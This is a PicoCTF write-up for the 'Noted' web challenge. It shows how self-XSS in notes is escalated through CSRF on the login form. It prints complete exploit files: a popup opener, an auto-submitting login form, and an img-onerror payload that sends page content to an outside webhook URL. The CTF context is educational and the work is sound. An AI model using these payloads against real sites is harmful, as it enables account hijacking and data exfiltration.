# Noted - PicoCTF Writeup

## Description:


I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right? Note that the headless browser used for the "report" feature does not have access to the internet.
(Note: in the real competition the bot *was* actually connected to the internet, b/c the bot for live art, another challenge, needed to be connected to the internet. The solve is about the same though)

## Site Overview:

##### /login

Standard login page

##### /register

Standard register page

##### /notes

Once logged in, users can post notes, short text posts that can be viewed here. You cannot view other people's notes. 

##### /new

Create a new note

##### /report

Report url to admin

## Solution

The solution to this is very interesting, but also very aggravating because I found the components to it the first time I looked at the challenge, but it took me three days of banging my head against the wall to put them together. When I first went over the source code, I wrote these notes in a comment in the source code:


Weird things
 * insecure session cookie?
 * about:blank movement
 * incognito mode
 * slowmo (debug purposes?)
 * to lower case?
 * login/register doesn't have csrf protection
 * self xss possible via notes


Most of them turned out to be irrelevant, but those last two are very important. First of all, self xss is possible via notes, meaning that by using a standard ``` <img src=c onerror="alert(1)"> ``` we can acheive xss. However, I originally dismissed this, as I didn't think I could escalate it into real xss. However, the key to doing this was hidden in the second to last "weird thing" - that the login and register functions didn't have csrf protection. The /new endpoint is protected like so:

```javascript

fastify.post('/new', {
		schema: noteSchema,
		preHandler: fastify.csrfProtection
	},

```

The /login endpoint, however, has no such protection. But you may be asking yourself, how can this be used to escalate self xss into real xss. In order to figure this out, I had to think outside the box, or rather, the **window**. The exploit that I evenutally came up with was composed of four steps:

1. Send the bot a link to my own site, which spawns a pop up window which goes to a different page on my site. 

2. Use a script in the popup window to log into my account on the noted website.

3. Send the original window back to the page with the flag using ```js 	history.go(-1); ```

4. Use the self-xss on my account to steal the flag and send it back to my site. 

The code for this exploit is as follows:


index.html

```html

<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
  
    <title></title>
</head>
<body>
<script>
	window.open('frame.html','popupwindow','width=450,height=250,menu=0,status=0');
	history.go(-1);
  
</script>
</body>
</html>

``` 

popup.html

```html

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">

<head>
  <meta charset="utf-8" />
  <title></title>
</head>

<body>

  <form id="form2" action="http://0.0.0.0:8080/login" method="POST">
    <input type="text" name="username" placeholder="username" value="payloadFinal2">
    <br><br>
    <input type="password" name="password" placeholder="password" value="payloadFinal2">
    <br><br>
    <input type="submit" value="Submit">
  </form>
  <script>

    var fo = document.getElementById("form2");
    fo.submit();
  </script>

</body>

</html>

```

XSS Payload

```html

<img src=c onerror="document.location='https://webhook.site/f275e53f-185c-4cdf-8d2b-13354f32b231/?'+window.parent.document.querySelector('p').innerHTML">

```

And then the flag:

picoCTF{p00rth0s_parl1ment_0f_p3p3gas_       }

## Review:

This was a very interesting challenge because it required you to think of a creative solution, without necesarily needing much technical knowledge. The exploit itself is quite simple, but thinking of it was hard. (It didn't help that I went down soooo many rabbit holes overthinking the hints)